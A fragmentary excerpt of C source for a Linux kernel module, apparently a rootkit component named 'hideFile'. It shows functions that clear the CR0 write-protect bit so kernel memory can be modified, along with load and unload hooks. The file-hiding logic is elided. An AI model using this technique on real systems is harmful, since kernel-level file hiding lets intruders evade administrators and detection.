...
void disable_write_protection(void){
    ...
    clear_bit(16,&cr0);
    write_cr0(cr0);
    printk("LKM4:disable Write Protection success\n");
    preempt_enable();
    return;
}
...
void enable_write_protection(void){
    ...
    write_cr0(cr0);
    preempt_enable();
    printk("LKM4:enable Write Protection success\n");
    return;
}
...
static int lkm_init(void){
    ...
    printk("LKM4:hideFile module loaded!\n");
...
static void lkm_exit(void){
    ...
    printk("LKM4:hideFile module removed\n");
